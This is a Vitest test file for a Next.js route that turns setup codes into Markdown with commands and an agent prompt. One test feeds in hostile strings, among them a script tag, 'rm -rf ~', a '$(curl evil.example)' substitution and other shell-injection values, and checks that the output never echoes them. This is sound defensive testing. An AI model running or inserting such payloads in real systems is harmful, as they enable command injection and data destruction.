/** @vitest-environment node */
import { NextRequest } from "next/server";
import { describe, expect, it } from "vitest";
import { GET } from "@/app/create.md/route";
import { decode } from "./code";
import { createCommands } from "./commands";
import { createMarkdown } from "./markdown";

const CODES = ["10", "1H11", "1J4blt1gX22"];

describe("createMarkdown", () => {
  it.each(CODES)("prints code %s's configuration, commands, files and prompt", (code) => {
    const result = decode(code);
    if (!result.ok) throw new Error(result.reason);
    const commands = createCommands(result.config);
    const text = createMarkdown(code);
    expect(text.startsWith(`# mangacn Create: code ${commands.code}\n`)).toBe(true);
    for (const line of [
      commands.nextProject,
      commands.viteProject,
      commands.existingProject,
      commands.lookOnly,
    ]) {
      expect(text).toContain(`\`\`\`bash\n${line}\n\`\`\``);
    }
    for (const heading of [
      "## Configuration",
      "## Commands",
      "## Files",
      "### Next.js",
      "### Vite",
      "## Prompt for an agent",
    ]) {
      expect(text).toContain(`\n${heading}\n`);
    }
    expect(text).toContain("- `app/globals.css`:");
    expect(text).toContain("- `src/index.css`:");
    expect(text).not.toContain("not used");
  });

  it("gives the default with a note for no code and for a bad one", () => {
    expect(createMarkdown(null)).toContain("No code was given, so this is the default");
    const bad = createMarkdown("9zz");
    expect(bad).toContain("# mangacn Create: code 10\n");
    expect(bad).toContain("This code was not used (code version 9 is not known)");
  });

  it("never prints a hostile code's text", () => {
    for (const hostile of [
      "<script>alert(1)</script>",
      "10;rm -rf ~",
      "10$(curl evil.example)",
      "10`id`",
      "1\nEVIL",
      "10 && echo pwned",
      `1${"Z".repeat(500)}`,
      "10%0Aevil",
    ]) {
      const text = createMarkdown(hostile);
      expect(text).toContain("so this is the default configuration");
      for (const fragment of [
        "script",
        "rm -rf",
        "evil",
        "pwned",
        "EVIL",
        "`id`",
        "Z".repeat(30),
      ]) {
        expect(text).not.toContain(fragment);
      }
    }
  });
});

describe("GET /create.md", () => {
  it("answers Markdown for ?c=", async () => {
    const response = GET(new NextRequest("https://www.mangacn.com/create.md?c=1H11"));
    expect(response.status).toBe(200);
    expect(response.headers.get("content-type")).toBe("text/markdown; charset=utf-8");
    expect(await response.text()).toBe(createMarkdown("1H11"));
  });

  it("answers the default with a note when the code is missing", async () => {
    const response = GET(new NextRequest("https://www.mangacn.com/create.md"));
    expect(await response.text()).toBe(createMarkdown(null));
  });
});
